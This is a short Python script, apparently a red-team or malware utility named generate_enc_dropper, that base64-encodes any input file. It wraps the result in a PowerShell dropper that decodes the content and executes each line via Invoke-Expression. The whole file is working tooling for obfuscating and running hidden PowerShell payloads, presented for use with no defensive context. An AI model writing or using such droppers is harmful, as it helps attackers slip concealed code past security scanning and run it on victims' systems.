import base64
import sys


decode_text_function = '''
function Decode-Text {
    [CmdletBinding()]
    param([Parameter(Mandatory=$true, ValueFromPipeline=$true)][string]$Text)
    $bytes = [System.Convert]::FromBase64String($Text)
    $decodedText = [System.Text.Encoding]::UTF8.GetString($bytes)
    return $decodedText
}

'''

variable_name = "$enc_text = "
function_call_and_ps_execution = '''

$decodedText = Decode-Text $enc_text
$lines = $decodedText -split "`n"
foreach($line in $lines) {Invoke-Expression $line}
'''


def convert_file_to_base64():
    try:
        with open(sys.argv[1], "rb") as file:
            file_contents = file.read()
        base64_encoded = base64.b64encode(file_contents)
        base64_encoded_str = base64_encoded.decode("utf-8")
        return "\""+base64_encoded_str+"\""
    except Exception as e:
        print("ERROR: ", e)
        usage_details()


def write_to_file():
    b64_convert = convert_file_to_base64()
    file_contents = decode_text_function + variable_name + b64_convert + function_call_and_ps_execution
    f = open(sys.argv[2], "w")
    f.write(file_contents)
    f.close()
    print("\nFile: enc_dropper.ps1 --> Written")


def usage_details():
    print("Usage Example 1: python3 generate_enc_dropper.py <path to file> <output file name>\n")
    print("Usage Example 2: generate_enc_dropper.exe <path to file> <output file name>")


if __name__ == '__main__':
    if len(sys.argv) != 3:
        print("CMD Line Args Error")
        usage_details()
        sys.exit()
    write_to_file()